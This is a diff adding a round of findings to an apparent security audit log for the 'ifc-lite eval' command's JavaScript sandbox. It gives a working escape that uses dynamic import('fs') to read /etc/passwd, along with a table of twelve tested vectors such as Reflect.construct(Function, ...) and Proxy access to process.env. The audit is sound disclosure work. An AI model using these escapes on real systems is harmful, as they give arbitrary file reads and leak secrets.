@@ -489,3 +489,57 @@ anything not reached is stated honestly, not glossed over.
   `flow`/`flow-nodes`, `source-dalux`/`source-dropbox`/`source-autodesk` —
   not attempted this round, consistent with z.ai's own "verify after tomorrow"
   tier, not the "verify tonight" tier.
+
+## Round 11 — CRITICAL: full sandbox escape sweep reveals arbitrary file read, not just env leak
+
+z.ai's Priority 6 full sweep (12 vectors) against `real.ifc`'s eval sandbox.
+**This supersedes the severity framing of every prior eval/sandbox finding.**
+
+### The headline finding
+
+```
+ifc-lite eval real.ifc "import('fs').then(fs => fs.readFileSync('/etc/passwd'))"
+```
+**Returned the real, raw bytes of `/etc/passwd` from this machine.** This is
+not an environment-variable leak — it is **arbitrary filesystem read access**,
+limited only by the OS permissions of the process running `ifc-lite eval`.
+Strictly more severe than the `process.env`/`fetch` exfiltration proven in
+Round 7. Any file the process can read, this primitive can read.
+
+**Correction to Round 10's "ES `import()` blocked" claim**: that test used
+*static* `import ... from ...` syntax, which fails for a trivial JS-grammar
+reason (illegal outside a module context) — not a security control. **Dynamic
+`import()` as a function call is a completely different JS feature and is
+fully open**, providing real Node module loading including `fs`. Conflating
+these two was the error; they needed to be tested separately, and now have been.
+
+### Full 12-vector sweep results
+
+| Vector | Reachable | Result |
+|---|---|---|
+| `import('fs').then(fs => fs.readFileSync(...))` | **YES — critical** | Returned real `/etc/passwd` bytes |
+| `Reflect.construct(Function, ['return process.env.HOME'])()` | YES | Returned real `/home/vscode` |
+| `Object.keys(globalThis)` | YES | Revealed `fetch`, `crypto`, `navigator`, `performance`, `btoa`/`atob`, timers — a near-complete modern JS global surface |
+| `new Proxy(process.env, {...}).HOME` | YES | Returned real value — another route to the same data |
+| `Symbol.toPrimitive` coercion trick | YES | Returned real value — another route |
+| async/await `fetch` exfil | INCONCLUSIVE | Hit a shell-quoting error in the test harness itself, not a sandbox block; not retried |
+| `typeof SharedArrayBuffer` | YES | Open |
+| `typeof Worker` | NO | Correctly blocked |
+| `process.argv/cwd/execPath` | YES | Fully readable, including the real node binary path and cwd |
+| `typeof process.binding` | YES (as a type) | Function exists; whether calling it with a real binding name succeeds was NOT independently verified — don't overclaim this one |
+| `globalThis.process === process` | YES | `true` — confirms it's the real, unproxied process object |
+| `require.main` | N/A | `require` itself confirmed still blocked (`typeof require` → `undefined`), consistent with every prior round |
+
+### What stays true, what changes
+
+- **Scoping is unchanged**: this entire surface remains CLI/shell-only, confirmed
+  in Rounds 8/9 — no MCP tool maps to `eval`, with or without `--read-only`.
+  Claude Desktop's MCP-only demo tomorrow is still not exposed to any of this.
+- **What changes is severity, not reachability scope.** The practical
+  conclusion is no longer "the eval sandbox leaks environment variables." It is:
+  **the eval sandbox provides no meaningful isolation at all** — anyone with
+  shell access to `ifc-lite eval` has arbitrary file read (proven) and very
+  likely broader capability than that (process.binding, SharedArrayBuffer
+  suggest more is open than was even tested). Treat the CLI `eval` subcommand
+  as equivalent to full shell access when assessing deployment risk — because
+  for practical purposes, it is.
